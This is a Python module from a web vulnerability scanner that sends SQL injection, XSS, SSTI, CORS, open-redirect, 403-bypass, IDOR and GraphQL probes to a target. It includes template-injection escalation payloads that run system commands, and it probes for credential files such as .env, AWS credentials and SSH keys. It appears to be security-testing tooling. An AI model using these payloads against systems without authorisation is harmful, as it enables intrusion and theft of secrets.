"""Vulnerability scanning: SQLi, XSS, CORS, CSRF, open redirect, etc."""
import re
import time
import urllib.parse
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

import requests
from bs4 import BeautifulSoup

from config import DEFAULT_TIMEOUT


def _get_base_url(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    return target.rstrip("/")


def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (compatible; SniperSan/1.0)"
    return s


# ─── SQL Injection ────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    ("'", "boolean"),
    ('"', "boolean"),
    ("' OR '1'='1", "boolean"),
    ("' OR 1=1--", "boolean"),
    ("' OR 1=1#", "boolean"),
    ("1' AND SLEEP(3)--", "time"),
    ("'; WAITFOR DELAY '0:0:3'--", "time"),
    ("1 AND 1=1", "boolean"),
    ("1 AND 1=2", "boolean"),
    ("UNION SELECT NULL--", "union"),
    ("' UNION SELECT NULL,NULL--", "union"),
]

SQLI_ERRORS = [
    r"sql syntax", r"mysql_fetch", r"ORA-\d{5}", r"Microsoft OLE DB",
    r"SQLSTATE", r"pg_query", r"Warning.*mysql", r"Unclosed quotation mark",
    r"syntax error.*SQL", r"sqlite_", r"db2_", r"mysql error",
    r"postgresql", r"quoted string not properly terminated",
]

SQLI_ERROR_RE = re.compile("|".join(SQLI_ERRORS), re.IGNORECASE)


def test_sqli(target: str, params: dict | None = None,
              forms: list | None = None) -> dict:
    """Test for SQL injection vulnerabilities."""
    url = _get_base_url(target)
    result = {"tool": "sqli", "target": url}
    vulnerabilities = []
    session = _make_session()

    def _test_url_params(test_url: str, base_params: dict) -> None:
        """Test URL parameters for SQLi."""
        for param in base_params:
            for payload, ptype in SQLI_PAYLOADS:
                test_params = base_params.copy()
                test_params[param] = payload

                try:
                    t_start = time.time()
                    resp = session.get(test_url, params=test_params,
                                      timeout=DEFAULT_TIMEOUT + 5)
                    elapsed = time.time() - t_start

                    # Error-based detection
                    if SQLI_ERROR_RE.search(resp.text):
                        vulnerabilities.append({
                            "type": "SQLi (error-based)",
                            "severity": "CRITICAL",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": "SQL error in response"
                        })
                        break

                    # Time-based detection
                    if ptype == "time" and elapsed >= 2.5:
                        vulnerabilities.append({
                            "type": "SQLi (time-based blind)",
                            "severity": "CRITICAL",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"Response delayed {elapsed:.1f}s"
                        })
                        break

                except Exception:
                    pass

    # Test URL parameters
    parsed = urlparse(url)
    url_params = parse_qs(parsed.query)
    if url_params:
        flat_params = {k: v[0] for k, v in url_params.items()}
        _test_url_params(url.split("?")[0], flat_params)
    elif params:
        _test_url_params(url, params)

    # Test forms
    if forms:
        for form in forms[:5]:
            action = form.get("action", "") or url
            if not action.startswith("http"):
                action = urljoin(url, action)
            inputs = {i["name"]: "test" for i in form.get("inputs", [])
                      if i.get("name") and i.get("type") not in ("submit", "button")}

            for param in inputs:
                for payload, ptype in SQLI_PAYLOADS[:5]:
                    test_data = inputs.copy()
                    test_data[param] = payload
                    try:
                        t_start = time.time()
                        if form.get("method", "GET").upper() == "POST":
                            resp = session.post(action, data=test_data,
                                               timeout=DEFAULT_TIMEOUT + 5)
                        else:
                            resp = session.get(action, params=test_data,
                                              timeout=DEFAULT_TIMEOUT + 5)
                        elapsed = time.time() - t_start

                        if SQLI_ERROR_RE.search(resp.text):
                            vulnerabilities.append({
                                "type": "SQLi (error-based)",
                                "severity": "CRITICAL",
                                "url": action,
                                "parameter": param,
                                "payload": payload,
                                "form_method": form.get("method", "GET"),
                                "evidence": "SQL error in response"
                            })
                            break
                        if ptype == "time" and elapsed >= 2.5:
                            vulnerabilities.append({
                                "type": "SQLi (time-based blind)",
                                "severity": "CRITICAL",
                                "url": action,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Response delayed {elapsed:.1f}s"
                            })
                            break
                    except Exception:
                        pass

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── XSS ─────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><script>alert(1)</script>',
    "';alert('XSS')//",
    '<svg onload=alert(1)>',
    '{{7*7}}',  # Template injection
    '${7*7}',   # Template injection
]


def test_xss(target: str, params: dict | None = None,
             forms: list | None = None) -> dict:
    """Test for Cross-Site Scripting (XSS) vulnerabilities."""
    url = _get_base_url(target)
    result = {"tool": "xss", "target": url}
    vulnerabilities = []
    session = _make_session()

    def _check_reflected(resp_text: str, payload: str) -> bool:
        return payload in resp_text or urllib.parse.quote(payload) in resp_text

    def _test_params_xss(test_url: str, test_params: dict, method: str = "GET") -> None:
        for param in test_params:
            for payload in XSS_PAYLOADS:
                data = test_params.copy()
                data[param] = payload
                try:
                    if method == "POST":
                        resp = session.post(test_url, data=data, timeout=DEFAULT_TIMEOUT)
                    else:
                        resp = session.get(test_url, params=data, timeout=DEFAULT_TIMEOUT)

                    if _check_reflected(resp.text, payload):
                        vuln = {
                            "type": "XSS (reflected)",
                            "severity": "HIGH",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": "Payload reflected in response"
                        }
                        # Check if inside script context (more dangerous)
                        if payload in resp.text:
                            vuln["evidence"] += " (unencoded)"
                        vulnerabilities.append(vuln)
                        break

                    # Template injection check
                    if "{{7*7}}" in data.values() and "49" in resp.text:
                        vulnerabilities.append({
                            "type": "SSTI (Server-Side Template Injection)",
                            "severity": "CRITICAL",
                            "url": test_url,
                            "parameter": param,
                            "payload": "{{7*7}}",
                            "evidence": "49 found in response"
                        })

                except Exception:
                    pass

    # URL params
    parsed = urlparse(url)
    url_params = parse_qs(parsed.query)
    if url_params:
        flat = {k: v[0] for k, v in url_params.items()}
        _test_params_xss(url.split("?")[0], flat)
    elif params:
        _test_params_xss(url, params)

    # Forms
    if forms:
        for form in forms[:5]:
            action = form.get("action", "") or url
            if not action.startswith("http"):
                action = urljoin(url, action)
            inputs = {i["name"]: "test" for i in form.get("inputs", [])
                      if i.get("name") and i.get("type") not in ("submit", "button", "hidden")}
            if inputs:
                _test_params_xss(action, inputs, form.get("method", "GET").upper())

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── CORS ─────────────────────────────────────────────────────────────────────

def check_cors(target: str) -> dict:
    """Test for CORS misconfiguration."""
    url = _get_base_url(target)
    result = {"tool": "cors", "target": url}
    vulnerabilities = []
    session = _make_session()

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        f"https://evil.{url.split('//')[1].split('/')[0]}",
        "null",
    ]

    for origin in test_origins:
        try:
            resp = session.options(url, headers={"Origin": origin,
                                                 "Access-Control-Request-Method": "GET"},
                                   timeout=DEFAULT_TIMEOUT)

            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                vulnerabilities.append({
                    "type": "CORS Wildcard",
                    "severity": "MEDIUM",
                    "url": url,
                    "evidence": "Access-Control-Allow-Origin: *"
                })
                break
            elif acao == origin:
                if acac.lower() == "true":
                    vulnerabilities.append({
                        "type": "CORS Origin Reflection + Credentials",
                        "severity": "HIGH",
                        "url": url,
                        "origin_tested": origin,
                        "evidence": f"Reflects origin with credentials allowed"
                    })
                else:
                    vulnerabilities.append({
                        "type": "CORS Origin Reflection",
                        "severity": "MEDIUM",
                        "url": url,
                        "origin_tested": origin,
                        "evidence": f"Reflects arbitrary origin"
                    })
                break
            elif acao == "null" and origin == "null":
                vulnerabilities.append({
                    "type": "CORS Null Origin",
                    "severity": "MEDIUM",
                    "url": url,
                    "evidence": "Accepts null origin"
                })
                break

        except Exception:
            pass

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── Open Redirect ────────────────────────────────────────────────────────────

def test_open_redirect(target: str, urls: list[str] | None = None) -> dict:
    """Test for open redirect vulnerabilities."""
    base_url = _get_base_url(target)
    result = {"tool": "open_redirect", "target": base_url}
    vulnerabilities = []
    session = _make_session()

    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https:evil.com",
    ]

    redirect_params = ["redirect", "url", "next", "return", "goto",
                       "dest", "destination", "redirect_uri", "return_url",
                       "callback", "continue", "location", "redir", "ref"]

    test_urls = urls or [base_url]

    for test_url in test_urls[:10]:
        parsed = urlparse(test_url)
        params = parse_qs(parsed.query)

        for param in list(params.keys()) + redirect_params:
            for payload in redirect_payloads:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                try:
                    resp = session.get(test_url.split("?")[0], params=test_params,
                                      timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location:
                        vulnerabilities.append({
                            "type": "Open Redirect",
                            "severity": "MEDIUM",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "redirect_to": location
                        })
                        break
                except Exception:
                    pass

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── Security Headers Deep Check ──────────────────────────────────────────────

def check_csrf(target: str, forms: list | None = None) -> dict:
    """Check for CSRF vulnerabilities in forms."""
    url = _get_base_url(target)
    result = {"tool": "csrf", "target": url}
    vulnerabilities = []
    session = _make_session()

    csrf_tokens = ["csrf", "token", "nonce", "_token", "csrfmiddlewaretoken",
                   "authenticity_token", "__RequestVerificationToken"]

    if not forms:
        try:
            resp = session.get(url, timeout=DEFAULT_TIMEOUT)
            soup = BeautifulSoup(resp.text, "lxml")
            forms = []
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                inputs = [{"name": i.get("name", ""), "type": i.get("type", "text")}
                          for i in form.find_all("input")]
                forms.append({"action": action, "method": method, "inputs": inputs})
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
            return result

    for form in forms:
        if form.get("method", "GET").upper() != "POST":
            continue

        input_names = [i.get("name", "").lower() for i in form.get("inputs", [])]
        has_csrf = any(token in name for name in input_names for token in csrf_tokens)

        if not has_csrf:
            action = form.get("action", "") or url
            if not action.startswith("http"):
                action = urljoin(url, action)

            # Also check for SameSite cookie attribute
            vulnerabilities.append({
                "type": "CSRF (missing token)",
                "severity": "HIGH",
                "url": action,
                "form_method": "POST",
                "evidence": "POST form missing CSRF token",
                "recommendation": "Add CSRF token to all state-changing forms"
            })

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── Sensitive File Exposure ──────────────────────────────────────────────────

def check_sensitive_files(target: str) -> dict:
    """Check for exposed sensitive files and paths."""
    url = _get_base_url(target)
    result = {"tool": "sensitive_files", "target": url}
    found = []
    session = _make_session()

    sensitive_paths = [
        (".env", "CRITICAL", "Environment file with credentials"),
        (".git/HEAD", "CRITICAL", "Git repository exposed"),
        (".git/config", "CRITICAL", "Git config exposed"),
        ("config.php", "HIGH", "PHP config file"),
        ("wp-config.php.bak", "CRITICAL", "WordPress config backup"),
        ("backup.sql", "HIGH", "Database backup"),
        ("dump.sql", "HIGH", "Database dump"),
        (".htpasswd", "HIGH", "Password file"),
        ("phpinfo.php", "HIGH", "PHP info page"),
        ("info.php", "MEDIUM", "PHP info page"),
        ("server-status", "MEDIUM", "Apache server status"),
        ("server-info", "MEDIUM", "Apache server info"),
        ("/.aws/credentials", "CRITICAL", "AWS credentials"),
        ("/.ssh/id_rsa", "CRITICAL", "SSH private key"),
        ("/proc/self/environ", "CRITICAL", "Process environment"),
        ("crossdomain.xml", "LOW", "Flash cross-domain policy"),
        ("clientaccesspolicy.xml", "LOW", "Silverlight policy"),
        ("package.json", "INFO", "Node.js package file"),
        ("composer.json", "INFO", "PHP composer file"),
        ("Gemfile", "INFO", "Ruby gemfile"),
        ("requirements.txt", "INFO", "Python requirements"),
        ("dockerfile", "MEDIUM", "Docker configuration"),
        ("docker-compose.yml", "MEDIUM", "Docker compose config"),
        (".travis.yml", "LOW", "CI configuration"),
        ("swagger.json", "INFO", "API documentation"),
        ("openapi.json", "INFO", "OpenAPI documentation"),
        ("graphql", "INFO", "GraphQL endpoint"),
    ]

    def _check(path_info):
        path, severity, description = path_info
        try:
            resp = session.get(f"{url}/{path}", timeout=DEFAULT_TIMEOUT,
                              allow_redirects=False)
            if resp.status_code == 200 and len(resp.content) > 0:
                return {
                    "path": f"/{path}",
                    "severity": severity,
                    "description": description,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "snippet": resp.text[:200] if resp.text else ""
                }
        except Exception:
            pass
        return None

    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(_check, p) for p in sensitive_paths]
        for f in concurrent.futures.as_completed(futures):
            hit = f.result()
            if hit:
                found.append(hit)

    found.sort(key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
               .get(x["severity"], 5))

    result["found"] = found
    result["total_found"] = len(found)
    result["success"] = True
    return result


# ─── HTTP Methods ─────────────────────────────────────────────────────────────

def check_http_methods(target: str) -> dict:
    """Test for dangerous HTTP methods (TRACE, PUT, DELETE, PATCH)."""
    url = _get_base_url(target)
    result = {"tool": "http_methods", "target": url}
    vulnerabilities = []
    session = _make_session()

    # Get allowed methods via OPTIONS
    allowed = []
    try:
        resp = session.options(url, timeout=DEFAULT_TIMEOUT)
        allow_header = resp.headers.get("Allow", "") or resp.headers.get("Access-Control-Allow-Methods", "")
        allowed = [m.strip().upper() for m in allow_header.split(",") if m.strip()]
        result["options_header"] = allow_header
    except Exception:
        pass

    dangerous = {
        "TRACE": ("HIGH", "TRACE enabled — can lead to Cross-Site Tracing (XST) attacks"),
        "PUT":   ("CRITICAL", "PUT enabled — may allow arbitrary file upload"),
        "DELETE": ("HIGH", "DELETE enabled — may allow resource deletion"),
        "CONNECT": ("MEDIUM", "CONNECT enabled — may allow proxy abuse"),
    }

    for method, (severity, desc) in dangerous.items():
        # Check if reported in OPTIONS
        if method in allowed:
            vulnerabilities.append({
                "type": f"Dangerous HTTP Method: {method}",
                "severity": severity,
                "url": url,
                "method": method,
                "evidence": f"{method} listed in Allow header",
                "description": desc
            })
            continue

        # Actively probe
        try:
            resp = session.request(method, url, timeout=DEFAULT_TIMEOUT)
            if resp.status_code not in (405, 501, 400, 403):
                vulnerabilities.append({
                    "type": f"Dangerous HTTP Method: {method}",
                    "severity": severity,
                    "url": url,
                    "method": method,
                    "status_code": resp.status_code,
                    "evidence": f"{method} returned {resp.status_code} (not 405 Method Not Allowed)",
                    "description": desc
                })
        except Exception:
            pass

    result["allowed_methods"] = allowed
    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── 403 Bypass ──────────────────────────────────────────────────────────────

def test_403_bypass(target: str, paths: list[str] | None = None) -> dict:
    """Test for 403 Forbidden bypass techniques."""
    url = _get_base_url(target)
    result = {"tool": "403_bypass", "target": url}
    vulnerabilities = []
    session = _make_session()

    # Default paths to test if none given
    test_paths = paths or ["/admin", "/config", "/dashboard", "/.env", "/api/admin"]

    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forward-For": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
    ]

    for path in test_paths[:10]:
        full_url = f"{url}{path}"
        try:
            # Baseline request
            base_resp = session.get(full_url, timeout=DEFAULT_TIMEOUT)
            if base_resp.status_code != 403:
                continue  # Only test 403 pages

            # Try header bypasses
            for headers in bypass_headers:
                try:
                    resp = session.get(full_url, headers=headers, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code == 200:
                        header_name = list(headers.keys())[0]
                        vulnerabilities.append({
                            "type": "403 Bypass",
                            "severity": "HIGH",
                            "url": full_url,
                            "bypass_header": f"{header_name}: {list(headers.values())[0]}",
                            "evidence": f"403 bypassed to 200 using {header_name}",
                            "original_status": 403,
                            "bypass_status": 200
                        })
                        break
                except Exception:
                    pass

            # Try path manipulation bypasses
            path_variants = [
                f"{full_url}/",
                f"{full_url}%2F",
                f"{full_url}%20",
                f"{full_url}..;/",
                f"{full_url}?",
                full_url.replace(path, path.upper()),
            ]
            for variant_url in path_variants:
                try:
                    resp = session.get(variant_url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code == 200:
                        vulnerabilities.append({
                            "type": "403 Bypass (path manipulation)",
                            "severity": "HIGH",
                            "url": variant_url,
                            "original_url": full_url,
                            "evidence": f"403 bypassed to 200 via URL variant",
                            "original_status": 403,
                            "bypass_status": 200
                        })
                        break
                except Exception:
                    pass

        except Exception:
            pass

    result["vulnerabilities"] = vulnerabilities
    result["paths_tested"] = test_paths
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── SSTI ─────────────────────────────────────────────────────────────────────

SSTI_FINGERPRINTS = [
    ("{{7*7}}",     "49",      "Jinja2/Twig"),
    ("{{7*'7'}}",   "7777777", "Jinja2"),
    ("{7*7}",       "49",      "Smarty"),
    ("${7*7}",      "49",      "Freemarker/Velocity"),
    ("<%= 7*7 %>",  "49",      "ERB"),
    ("#{7*7}",      "49",      "Ruby Slim"),
    ("*{7*7}",      "49",      "Thymeleaf"),
]

SSTI_ESCALATION = {
    "Jinja2":             "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "Jinja2/Twig":        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "Smarty":             "{system('id')}",
    "Freemarker":         '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    "Freemarker/Velocity": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    "ERB":                "<%= `id` %>",
}


def test_ssti(target: str, forms: list | None = None) -> dict:
    """Extended Server-Side Template Injection testing with engine fingerprinting."""
    url = _get_base_url(target)
    result = {"tool": "ssti", "target": url}
    vulnerabilities = []
    session = _make_session()

    def _probe(test_url: str, param: str, method: str = "GET", base_data: dict | None = None) -> None:
        for payload, expected, engine in SSTI_FINGERPRINTS:
            data = (base_data or {}).copy()
            data[param] = payload
            try:
                if method == "POST":
                    resp = session.post(test_url, data=data, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.get(test_url, params=data, timeout=DEFAULT_TIMEOUT)

                if expected in resp.text:
                    escalation = SSTI_ESCALATION.get(engine, "")
                    vulnerabilities.append({
                        "type": f"SSTI ({engine})",
                        "severity": "CRITICAL",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"{expected!r} found in response — {engine} detected",
                        "escalation_payload": escalation,
                    })
                    break  # One confirmed engine per param is enough
            except Exception:
                pass

    # Test URL parameters
    parsed = urlparse(url)
    url_params = parse_qs(parsed.query)
    if url_params:
        flat = {k: v[0] for k, v in url_params.items()}
        for param in flat:
            _probe(url.split("?")[0], param, base_data=flat)

    # Test forms
    if forms:
        for form in forms[:5]:
            action = form.get("action", "") or url
            if not action.startswith("http"):
                action = urljoin(url, action)
            inputs = {i["name"]: "test" for i in form.get("inputs", [])
                      if i.get("name") and i.get("type") not in ("submit", "button", "hidden")}
            method = form.get("method", "GET").upper()
            for param in inputs:
                _probe(action, param, method=method, base_data=inputs)

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── IDOR ─────────────────────────────────────────────────────────────────────

IDOR_PII_FIELDS = {"email", "name", "address", "phone", "ssn", "credit", "password"}


def test_idor(target: str, urls: list | None = None) -> dict:
    """IDOR/Broken Object Level Authorization testing."""
    base_url = _get_base_url(target)
    result = {"tool": "idor", "target": base_url}
    vulnerabilities = []
    session = _make_session()

    all_urls = list({base_url} | set(urls or []))

    def _id_variants(id_val: str) -> list[str]:
        try:
            n = int(id_val)
            candidates = [n - 1, n + 1, 0, 1, 9999]
            return [str(v) for v in candidates if v != n and v >= 0]
        except ValueError:
            return []

    def _has_pii(text: str) -> bool:
        lower = text.lower()
        return any(field in lower for field in IDOR_PII_FIELDS)

    def _size_diff_pct(a: str, b: str) -> float:
        if not a:
            return 1.0
        return abs(len(a) - len(b)) / max(len(a), 1)

    def _json_keys(text: str) -> set:
        import json
        try:
            obj = json.loads(text)
            if isinstance(obj, dict):
                return set(obj.keys())
        except Exception:
            pass
        return set()

    for test_url in all_urls[:10]:
        parsed = urlparse(test_url)
        path_segments = [s for s in parsed.path.split("/") if s]

        # --- Path-segment IDs ---
        for idx, segment in enumerate(path_segments):
            if not re.match(r"^\d+$", segment):
                continue
            for variant in _id_variants(segment):
                new_segments = path_segments[:]
                new_segments[idx] = variant
                new_path = "/" + "/".join(new_segments)
                variant_url = parsed._replace(path=new_path).geturl()
                try:
                    base_resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    var_resp  = session.get(variant_url, timeout=DEFAULT_TIMEOUT)
                    if var_resp.status_code != 200:
                        continue
                    diff = _size_diff_pct(base_resp.text, var_resp.text)
                    diff_keys = _json_keys(base_resp.text) != _json_keys(var_resp.text)
                    if diff > 0.20 or diff_keys:
                        pii = _has_pii(var_resp.text)
                        vulnerabilities.append({
                            "type": "IDOR",
                            "severity": "CRITICAL" if pii else "HIGH",
                            "url": variant_url,
                            "parameter": f"path[{idx}]",
                            "original_id": segment,
                            "tested_id": variant,
                            "evidence": (
                                f"Status 200; {'PII fields detected; ' if pii else ''}"
                                f"size diff {diff:.0%}"
                            ),
                        })
                        break
                except Exception:
                    pass

        # --- Query-param IDs ---
        qp = parse_qs(parsed.query)
        for param, values in qp.items():
            val = values[0]
            if not re.match(r"^\d+$", val):
                continue
            for variant in _id_variants(val):
                test_params = {k: v[0] for k, v in qp.items()}
                test_params[param] = variant
                variant_url = test_url.split("?")[0]
                try:
                    base_resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    var_resp  = session.get(variant_url, params=test_params,
                                            timeout=DEFAULT_TIMEOUT)
                    if var_resp.status_code != 200:
                        continue
                    diff = _size_diff_pct(base_resp.text, var_resp.text)
                    diff_keys = _json_keys(base_resp.text) != _json_keys(var_resp.text)
                    if diff > 0.20 or diff_keys:
                        pii = _has_pii(var_resp.text)
                        vulnerabilities.append({
                            "type": "IDOR",
                            "severity": "CRITICAL" if pii else "HIGH",
                            "url": f"{variant_url}?{urlencode(test_params)}",
                            "parameter": param,
                            "original_id": val,
                            "tested_id": variant,
                            "evidence": (
                                f"Status 200; {'PII fields detected; ' if pii else ''}"
                                f"size diff {diff:.0%}"
                            ),
                        })
                        break
                except Exception:
                    pass

    result["vulnerabilities"] = vulnerabilities
    result["total_found"] = len(vulnerabilities)
    result["success"] = True
    return result


# ─── GraphQL ──────────────────────────────────────────────────────────────────

GRAPHQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql", "/graphiql"]
GRAPHQL_SENSITIVE_FIELDS = {"password", "token", "secret", "api_key", "private_key", "ssn", "credit_card"}
GRAPHQL_INTROSPECTION_QUERY = {"query": "{ __schema { types { name fields { name type { name } } } } }"}
GRAPHQL_SUGGESTION_QUERY   = {"query": "{__typ{name}}"}


def test_graphql(target: str) -> dict:
    """GraphQL introspection and security testing."""
    import json

    url = _get_base_url(target)
    result = {"tool": "graphql", "target": url}
    vulnerabilities = []
    endpoints_found = []
    schema_summary  = {"type_count": 0, "mutation_count": 0, "sensitive_fields": []}
    session = _make_session()

    for endpoint in GRAPHQL_ENDPOINTS:
        full_url = url + endpoint
        try:
            # ── Introspection ──────────────────────────────────────────────
            resp = session.post(full_url, json=GRAPHQL_INTROSPECTION_QUERY,
                                headers={"Content-Type": "application/json"},
                                timeout=DEFAULT_TIMEOUT)
            if resp.status_code != 200 or "__schema" not in resp.text:
                # ── Field suggestion probe (reveals schema without introspection) ──
                sug_resp = session.post(full_url, json=GRAPHQL_SUGGESTION_QUERY,
                                        headers={"Content-Type": "application/json"},
                                        timeout=DEFAULT_TIMEOUT)
                if sug_resp.status_code == 200 and "Did you mean" in sug_resp.text:
                    endpoints_found.append(full_url)
                    vulnerabilities.append({
                        "type": "GraphQL Field Suggestion Enabled",
                        "severity": "MEDIUM",
                        "url": full_url,
                        "evidence": '"Did you mean" hint reveals schema without introspection',
                    })
                continue

            endpoints_found.append(full_url)

            # Flag introspection as information disclosure
            vulnerabilities.append({
                "type": "GraphQL Introspection Enabled",
                "severity": "CRITICAL",
                "url": full_url,
                "evidence": "Full schema exposed via __schema introspection query",
            })

            # ── Parse schema ───────────────────────────────────────────────
            data = resp.json()
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            schema_summary["type_count"] = len(types)

            found_sensitive: list[str] = []
            mutation_types_without_auth: list[str] = []

            for t in types:
                type_name = (t.get("name") or "").lower()
                fields = t.get("fields") or []
                field_names = [(f.get("name") or "").lower() for f in fields]

                # Sensitive field detection
                for fname in field_names:
                    for sensitive in GRAPHQL_SENSITIVE_FIELDS:
                        if sensitive in fname and fname not in found_sensitive:
                            found_sensitive.append(fname)

                # Mutation without obvious auth args
                if "mutation" in type_name:
                    schema_summary["mutation_count"] += len(fields)
                    auth_indicators = {"token", "auth", "authorization", "session", "key"}
                    for f in fields:
                        f_name = (f.get("name") or "").lower()
                        if not any(a in f_name for a in auth_indicators):
                            mutation_types_without_auth.append(f_name)

            if found_sensitive:
                schema_summary["sensitive_fields"] = found_sensitive
                vulnerabilities.append({
                    "type": "GraphQL Sensitive Fields Exposed",
                    "severity": "HIGH",
                    "url": full_url,
                    "evidence": f"Sensitive fields in schema: {', '.join(found_sensitive)}",
                })

            if mutation_types_without_auth:
                vulnerabilities.append({
                    "type": "GraphQL Mutations Without Auth Args",
                    "severity": "MEDIUM",
                    "url": full_url,
                    "evidence": (
                        f"Mutations with no auth indicators: "
                        f"{', '.join(mutation_types_without_auth[:5])}"
                    ),
                })

            # ── Alias batching (rate-limit / DoS bypass) ───────────────────
            batched_query = "{ " + " ".join(
                f'a{i}: __typename' for i in range(1, 11)
            ) + " }"
            try:
                batch_resp = session.post(
                    full_url, json={"query": batched_query},
                    headers={"Content-Type": "application/json"},
                    timeout=DEFAULT_TIMEOUT,
                )
                if batch_resp.status_code == 200:
                    batch_data = batch_resp.json().get("data", {})
                    if len(batch_data) >= 10:
                        vulnerabilities.append({
                            "type": "GraphQL Alias Batching (DoS / Rate-Limit Bypass)",
                            "severity": "MEDIUM",
                            "url": full_url,
                            "evidence": "10 aliased queries executed in a single request",
                        })
            except Exception:
                pass

            # ── Field suggestion (also test even when introspection works) ──
            try:
                sug_resp = session.post(full_url, json=GRAPHQL_SUGGESTION_QUERY,
                                        headers={"Content-Type": "application/json"},
                                        timeout=DEFAULT_TIMEOUT)
                if sug_resp.status_code == 200 and "Did you mean" in sug_resp.text:
                    vulnerabilities.append({
                        "type": "GraphQL Field Suggestion Enabled",
                        "severity": "MEDIUM",
                        "url": full_url,
                        "evidence": '"Did you mean" hint present in error response',
                    })
            except Exception:
                pass

        except Exception:
            pass

    result["endpoints_found"] = endpoints_found
    result["vulnerabilities"] = vulnerabilities
    result["schema_summary"]  = schema_summary
    result["total_found"]     = len(vulnerabilities)
    result["success"]         = True
    return result


# ─── Nuclei ───────────────────────────────────────────────────────────────────

NUCLEI_SEVERITY_MAP = {
    "critical": "CRITICAL",
    "high":     "HIGH",
    "medium":   "MEDIUM",
    "low":      "LOW",
    "info":     "INFO",
}


def run_nuclei(target: str,
               templates: str = "cves,vulnerabilities,exposures,misconfiguration") -> dict:
    """Run Nuclei scanner against target."""
    import json
    import subprocess

    url = _get_base_url(target)
    result = {"tool": "nuclei", "target": url}
    vulnerabilities = []

    cmd = [
        "nuclei",
        "-u", url,
        "-tags", templates,
        "-jsonl",
        "-silent",
        "-timeout", "5",
    ]

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300,
        )
        for line in proc.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                finding = json.loads(line)
                info        = finding.get("info", {})
                raw_sev     = (info.get("severity") or "info").lower()
                severity    = NUCLEI_SEVERITY_MAP.get(raw_sev, "INFO")
                vulnerabilities.append({
                    "type":        info.get("name", "Unknown"),
                    "severity":    severity,
                    "url":         finding.get("matched-at", url),
                    "template_id": finding.get("template-id", ""),
                    "evidence":    info.get("description", ""),
                })
            except json.JSONDecodeError:
                pass

        result["vulnerabilities"] = vulnerabilities
        result["total_found"]     = len(vulnerabilities)
        result["success"]         = True

    except FileNotFoundError:
        result["vulnerabilities"] = []
        result["total_found"]     = 0
        result["success"]         = False
        result["error"] = (
            "nuclei not found. Install it with: "
            "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        )
    except subprocess.TimeoutExpired:
        result["vulnerabilities"] = vulnerabilities
        result["total_found"]     = len(vulnerabilities)
        result["success"]         = False
        result["error"]           = "nuclei scan timed out after 300s"

    return result
